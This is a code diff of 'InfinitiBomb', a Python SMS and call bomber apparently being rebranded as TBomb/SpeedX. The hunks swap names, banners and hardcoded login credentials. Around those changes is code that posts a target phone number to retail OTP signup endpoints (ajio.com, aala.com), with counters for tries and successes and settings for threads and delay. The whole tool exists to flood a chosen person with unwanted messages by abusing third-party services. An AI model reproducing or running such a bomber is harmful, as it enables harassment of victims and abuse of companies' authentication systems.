@@ -288,7 +288,7 @@ def checkinternet():
         res = True
     if res:
         print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
-        print('\t\tInfinitiBomb Shut-Downed...\n\n')
+        print('\t\tTBomb Will Stop Now...\n\n')
         banner()
         exit()
 
@@ -590,7 +590,7 @@ def getapi(pn,lim,cc):
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
 
-        data = {"firstName":"SathishInfiniti","login":"sathish.infinitihub@gmail.com","password":"infiniti@8365","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}
+        data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}
 
         response = requests.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, cookies=cookies, json=data)
         rd=response.text
@@ -644,8 +644,8 @@ def getapi(pn,lim,cc):
 
         data = {
           'email': cc+pn,
-          'firstname': 'Infiniti',
-          'lastname': 'Infiniti'
+          'firstname': 'SpeedX',
+          'lastname': 'SpeedX'
         }
 
         response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
@@ -729,18 +729,18 @@ def start(target, counter, delay, ch, cc):
                     input('Press Enter To Exit...')
                     exit()
         print(random.choice(colors))
-        print("..................................................................")
-        print("     !!         InfinitiBomb is Working, please wait       !!     ")
-        print("     !!   Please Dont Turn Off ur Internet While bombing   !!     ")
-        print("..................................................................")
+        print("..............................................................")
+        print("    !!         InfinitiBomb is Working, please wait       !!     ")
+        print("    !!   Please Dont Turn Off ur Internet While bombing   !!     ")
+        print("..............................................................")
         print("             Number to Bomb          : +" + str(cc) + " ", target)
         print("             Number of Tries Made    : ", requested)
         print("             Successfull Attempts    : ", success)
         print("             Failed Attempts         : ", failed)
-        print("..................................................................")
-        print("     !!       Please Don't Do Serious Things Using this       !!  ")
-        print("     !!  This InfinitiBomber Was Created By Sathish Infiniti  !!  ")
-        print("..................................................................")
+        print("..............................................................")
+        print("    !!       Please Don't Do Serious Things Using this       !!  ")
+        print("    !!  This InfinitiBomber Was Created By Sathish Infiniti  !!  ")
+        print("..............................................................")
         try:
             result = getapi(target, api, cc)
         except Exception:
@@ -780,11 +780,11 @@ banner()
 try:
     urllib.request.urlopen('https://www.google.com')
 except Exception:
-    print("You are not connected To Internet!!!")
-    print("\tPlease Connect To Internet To Continue...\n")
-    input('Exiting....\n Press Enter To Continue....')
+    print("\nYou are not connected To Internet!!!")
+    print("\nPlease Connect To Internet To Continue...\n")
+    input('Exiting....\n Press Enter To Continue....\n')
     exit()
-print('\tChecking For Updates...')
+print('\nChecking For Updates...')
 ver = urllib.request.urlopen(
     "https://raw.githubusercontent.com/sathish-infiniti/InfinitiBomb/master/.version").read().decode('utf-8')
 verl = ''
@@ -793,10 +793,10 @@ try:
 except Exception:
     pass
 if ver != verl:
-    print('\n\t\tAn Update is Available....')
-    print('\tStarting Update...')
+    print('\nAn Update is Available....')
+    print('\nStarting Update...')
     update()
-print("Your Version is Up-To-Date")
+print("\nYour Version is Up-To-Date")
 print('\n\n\t\t\tStarting InfinitiBomb...\n\n')
 try:
     noti = urllib.request.urlopen(
@@ -834,7 +834,7 @@ try:
 except Exception:
     type = 0
 if type == 1:
-    nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
+    nm = int(input("\tEnter Number of Calls To Send(Maximum 15): "))
     if nm > 15:
         print("\t\tYou Have Entered " + str(nm) +
               ".\n\tNormalizing Value To 15")
@@ -899,17 +899,17 @@ if nm == 0:
     print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
     t = [None] * nt
     print(random.choice(colors))
-    print("..................................................................")
-    print("     !!         InfinitiBomb is Working, please wait       !!     ")
-    print("     !!   Please Dont Turn Off ur Internet While bombing   !!     ")
-    print("..................................................................")
+    print("..............................................................")
+    print("    !!         InfinitiBomb is Working, please wait       !!     ")
+    print("    !!   Please Dont Turn Off ur Internet While bombing   !!     ")
+    print("..............................................................")
     print("             Target Number       : +91", pn)
     print("             Number of Threads   : ", nt)
     print("             Delay               : ", dl)
-    print("..................................................................")
-    print("     !!       Please Don't Do Serious Things Using this       !!  ")
-    print("     !!  This InfinitiBomber Was Created By Sathish Infiniti  !!  ")
-    print("..................................................................")
+    print("..............................................................")
+    print("    !!       Please Don't Do Serious Things Using this       !!  ")
+    print("    !!  This InfinitiBomber Was Created By Sathish Infiniti  !!  ")
+    print("..............................................................")
     print(W)
     input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
     os.system('rm *.xxx* > /dev/null 2>&1')
